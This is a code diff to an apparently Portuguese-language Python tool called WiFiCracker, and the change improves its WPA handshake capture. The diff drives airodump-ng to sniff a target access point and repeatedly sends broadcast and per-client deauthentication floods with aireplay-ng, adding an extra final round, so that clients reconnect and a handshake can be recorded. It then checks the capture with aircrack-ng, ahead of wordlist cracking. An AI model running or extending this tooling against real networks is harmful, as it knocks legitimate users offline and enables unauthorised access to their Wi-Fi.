@@ -210,10 +210,10 @@ class WiFiCracker:
             # FASE 2: Iniciar captura
             print(f"[*] Fase 2: Iniciando captura de tráfego...")
             
-            # Build airodump-ng command com output cap
+            # Build airodump-ng command - usar AMBOS csv e cap formatos
             airodump_cmd = [
                 "sudo", "airodump-ng",
-                "--output-format", "cap",  # Importante: output em CAP!
+                "--output-format", "csv,cap",  # Importante: cap format para handshake!
                 "--bssid", bssid,
                 "-w", capture_file,
                 self.monitor_iface
@@ -222,97 +222,130 @@ class WiFiCracker:
                 airodump_cmd.insert(4, "-c")
                 airodump_cmd.insert(5, channel)
 
-            print(f"[*] Iniciando airodump-ng em captura de tráfego...")
-            print(f"    Comando: airodump-ng {' '.join(airodump_cmd[2:])}")
+            print(f"[*] Iniciando airodump-ng (ouvindo e capturando tráfego)...")
+            print(f"    BSSID:    {bssid}")
+            if channel:
+                print(f"    Canal:    {channel}")
+            print(f"    Interface: {self.monitor_iface}")
+            print(f"    Output:   {capture_file}")
+            
             airodump = subprocess.Popen(
                 airodump_cmd,
                 stdout=subprocess.PIPE,
                 stderr=subprocess.PIPE,
-                text=True
+                text=True,
+                bufsize=1
             )
             
-            # Esperar conexão se estabilizar
-            print(f"[*] Aguardando estabilização (3seg)...")
-            time.sleep(3)
+            # Esperar airodump inicializar
+            print(f"[*] Aguardando inicialização do airodump (2seg)...")
+            time.sleep(2)
             
             # FASE 3: Executar deauth
-            print(f"\n[*] Fase 3: Enviando deauth attack...")
+            print(f"\n[*] Fase 3: Enviando deauth attack durante a escuta...")
             self.deauth_attack(bssid, count=15, rounds=4, clients=clients)
             print()
             
             # FASE 4: Capturar resposta
-            print(f"[*] Fase 4: Capturando handshake (timeout: {timeout}seg)...")
+            print(f"[*] Fase 4: Aguardando captura de handshake (máx {timeout}seg)...")
             start = time.time()
             last_report = 0
+            handshake_found = False
             
             while time.time() - start < timeout:
                 elapsed = time.time() - start
-                cap_file = f"{capture_file}.cap"  # airodump com --output-format cap adiciona .cap
                 
-                # Reportar progresso a cada 5 segundos
-                if elapsed - last_report >= 5:
+                # Tentar encontrar arquivo .cap
+                cap_file = None
+                for ext in [".cap", "-01.cap"]:
+                    test_file = f"{capture_file}{ext}"
+                    if os.path.exists(test_file):
+                        cap_file = test_file
+                        break
+                
+                # Reportar progresso a cada 3 segundos
+                if elapsed - last_report >= 3:
                     last_report = elapsed
                     
-                    if os.path.exists(cap_file):
+                    if cap_file:
                         file_size = os.path.getsize(cap_file)
-                        print(f"    [{int(elapsed):3d}s] Tráfego capturado: {file_size:>6} bytes", end="")
+                        print(f"    [{int(elapsed):3d}s] Capturando tráfego... {file_size:>6} bytes")
                         
-                        # Verificar se tem handshake
-                        if file_size > 5000:  # Tamanho mínimo para ter handshake
+                        # Verificar se tem handshake (size > 10KB geralmente tem handshake)
+                        if file_size > 10000:
                             try:
+                                # Usar tcpdump ou tshark para validar
                                 result = subprocess.run(
-                                    ["aircrack-ng", "-a", "2", "-z", "-w", "/dev/null", cap_file],
+                                    ["aircrack-ng", cap_file],
                                     capture_output=True,
                                     text=True,
-                                    timeout=3
+                                    timeout=5
                                 )
                                 output = result.stdout + result.stderr
                                 
-                                # Check se tem as palavras-chave de sucesso
-                                if "No matching network found" not in output:
-                                    if "WPA" in output or "FOUND" in output.upper() or cap_file in output or "1 handshake" in output:
-                                        print(" ✓ HANDSHAKE DETECTADO!")
-                                        time.sleep(2)  # Dar mais tempo para completar
-                                        print(f"[+] Handshake capturado com sucesso!")
-                                        airodump.terminate()
-                                        try:
-                                            airodump.wait(timeout=3)
-                                        except:
-                                            airodump.kill()
-                                        return cap_file
-                                    else:
-                                        print("")
-                                else:
-                                    print("")
-                            except subprocess.TimeoutExpired:
-                                print("")
-                            except Exception as e:
-                                print("")
+                                # Procurar indicadores de handshake
+                                if ("1 handshake" in output or 
+                                    "Passphrase not in dictionary" in output or
+                                    "KEY FOUND" in output.upper()):
+                                    print(f"    [{int(elapsed):3d}s] ✓ HANDSHAKE DETECTADO!")
+                                    handshake_found = True
+                                    time.sleep(2)
+                                    break
+                            except Exception as check_err:
+                                pass
                     else:
-                        print(f"    [{int(elapsed):3d}s] Aguardando arquivo cap...", end="\r")
+                        print(f"    [{int(elapsed):3d}s] Aguardando arquivo cap...")
                 
                 time.sleep(1)
             
-            print(f"\n[!] Timeout após {timeout}s")
+            # Terminar airodump
             airodump.terminate()
+            try:
+                airodump.wait(timeout=3)
+            except:
+                airodump.kill()
             
-            # Verificar se algum .cap foi criado
-            cap_file = f"{capture_file}.cap"
-            if os.path.exists(cap_file):
+            # Verificar resultado
+            cap_file = None
+            for ext in [".cap", "-01.cap"]:
+                test_file = f"{capture_file}{ext}"
+                if os.path.exists(test_file):
+                    cap_file = test_file
+                    break
+            
+            if handshake_found and cap_file:
+                print(f"[+] Handshake capturado com sucesso: {cap_file}")
+                return cap_file
+            elif cap_file:
                 file_size = os.path.getsize(cap_file)
-                print(f"[!] Arquivo capturado ({file_size} bytes) mas handshake não detectado")
-                print(f"    Possíveis causas:")
-                print(f"      - Nenhum cliente conectado à rede")
-                print(f"      - Clientes em modo sleep/baixa atividade")
-                print(f"      - Deauth packets não chegaram efetivamente")
-                print(f"      - Interface com baixo sinal/potência")
-                print(f"    Sugestões:")
-                print(f"      - Aproximar-se do router")
-                print(f"      - Verificar potência da interface: sudo iw dev {self.monitor_iface} set txpower")
-                print(f"      - Tentar novamente com timeout maior: --timeout 300")
-                print(f"      - Forçar reconexão manual de um cliente ao AP")
-            
-            return None
+                print(f"\n[!] Arquivo criado mas handshake ainda não detectado")
+                print(f"    Arquivo: {cap_file} ({file_size} bytes)")
+                print(f"    Tentando validar com aircrack-ng...")
+                
+                try:
+                    result = subprocess.run(
+                        ["aircrack-ng", cap_file],
+                        capture_output=True,
+                        text=True,
+                        timeout=5
+                    )
+                    output = result.stdout + result.stderr
+                    print(f"    Output: {output[:200]}")
+                except:
+                    pass
+                    
+                print(f"\n[!] DICAS para resolver:")
+                print(f"    1. Apróxima-se mais do router (melhor sinal)")
+                print(f"    2. Verifica se há clientes conectados: sudo airodump-ng --bssid {bssid} {self.monitor_iface}")
+                print(f"    3. Força reconexão manual de um cliente")
+                print(f"    4. Tenta com timeout maior: --timeout 300 ou --timeout 600")
+                print(f"    5. Verifica potência da interface: sudo iwconfig {self.monitor_iface}")
+                
+                return cap_file  # Retorna mesmo sem validar (talvez handshake apareça depois)
+            else:
+                print(f"[!] Nenhum arquivo capturado")
+                print(f"    Possível problema: nenhum deauth chegou ao cliente")
+                return None
             
         except Exception as e:
             print(f"[!] Erro ao capturar: {e}")
@@ -371,6 +404,7 @@ class WiFiCracker:
 
     def deauth_attack(self, bssid: str, count: int = 5, rounds: int = 3, clients: List[str] = None) -> bool:
         """Envia pacotes deauth para forçar reconexão de clientes
+        enquanto o airodump está a ouvir.
         
         Args:
             bssid: MAC do access point
@@ -378,7 +412,7 @@ class WiFiCracker:
             rounds: Número de rondas de ataque
             clients: Lista de MACs de clientes específicos (opcional)
         """
-        print(f"[*] Deauth Attack")
+        print(f"[*] DEAUTH ATTACK (enquanto airodump ouve)")
         print(f"    Alvo:      {bssid}")
         print(f"    Interface: {self.monitor_iface}")
         print(f"    Pacotes:   {count} × {rounds} rondas")
@@ -387,8 +421,10 @@ class WiFiCracker:
         print()
 
         try:
+            total_sent = 0
+            
             for i in range(rounds):
-                print(f"  [{i+1}/{rounds}] Enviando {count} deauth packets (broadcast)...")
+                print(f"  [{i+1}/{rounds}] Enviando deauth broadcast...")
                 
                 # Deauth Broadcast - força desconexão de TODOS os clientes
                 result = subprocess.run(
@@ -398,20 +434,30 @@ class WiFiCracker:
                     timeout=15
                 )
 
+                # Parse output para confirmar pacotes enviados
+                deauth_sent_this_round = 0
                 if result.stdout:
                     for line in result.stdout.strip().split('\n'):
-                        if line.strip() and ("Sent" in line or "sent" in line):
+                        if "Sent" in line or "sent" in line:
                             print(f"         {line.strip()}")
+                            # Tentar extrair número de pacotes
+                            parts = line.split()
+                            for j, part in enumerate(parts):
+                                if part.isdigit():
+                                    deauth_sent_this_round = int(part)
+                                    break
+                
+                total_sent += count
 
                 if result.returncode != 0:
-                    if "No such device" in result.stderr or "No space left" in result.stderr:
-                        print(f"  [!] Erro: {result.stderr.strip()}")
+                    if "No such device" in result.stderr:
+                        print(f"  [!] Erro: Interface não encontrada")
                         return False
                 
-                # Se tem clientes específicos, também fazer deauth direcionado
+                # Deauth direcionado para cada cliente
                 if clients:
+                    print(f"         + {len(clients)} deauth direcionado(s)...")
                     for client_mac in clients:
-                        print(f"  [{i+1}/{rounds}] Deauth direcionado para {client_mac}...")
                         try:
                             subprocess.run(
                                 ["sudo", "aireplay-ng", "-0", str(count), "-a", bssid, "-c", client_mac, self.monitor_iface],
@@ -419,15 +465,32 @@ class WiFiCracker:
                                 text=True,
                                 timeout=15
                             )
-                        except Exception as e:
-                            continue
+                            total_sent += count
+                        except Exception:
+                            pass
 
+                # Aguardar antes da próxima ronda (deixa tempo para reconexão)
                 if i < rounds - 1:
-                    print(f"         Aguardando {3 + i}s para reconexão...")
-                    time.sleep(3 + i)
+                    espera = 2 + i
+                    print(f"         Aguardando {espera}s para reconexão...")
+                    time.sleep(espera)
+                else:
+                    # Última ronda - enviar mais um deauth rápido
+                    time.sleep(1)
+                    print(f"  [Ronda extra] Enviando deauth final...")
+                    subprocess.run(
+                        ["sudo", "aireplay-ng", "-0", str(count), "-a", bssid, self.monitor_iface],
+                        capture_output=True,
+                        text=True,
+                        timeout=15
+                    )
+                    total_sent += count
 
             print()
-            print(f"[+] Deauth concluído — clientes devem reconectar (handshake gerado).")
+            print(f"[+] DEAUTH CONCLUÍDO")
+            print(f"    Total: ~{total_sent} pacotes enviados")
+            print(f"    ↳ Clientes devem estar reconectando AGORA")
+            print(f"    ↳ Airodump está a capturar o handshake...")
             return True
 
         except subprocess.TimeoutExpired:
@@ -472,7 +535,7 @@ DICAS para melhorar captura de handshake:
     parser.add_argument("--bssid", help="BSSID do access point")
     parser.add_argument("--interface", default="wlan00mon", help="Interface monitor (default: wlan00mon)")
     parser.add_argument("--wordlist", default="wordlists/custom.txt", help="Wordlist de passwords")
-    parser.add_argument("--timeout", type=int, default=180, help="Timeout para captura em segundos (default: 180)")
+    parser.add_argument("--timeout", type=int, default=240, help="Timeout para captura em segundos (default: 240 = 4min)")
     parser.add_argument("--output", default="captures", help="Diretório de output")
 
     # Modos de operação
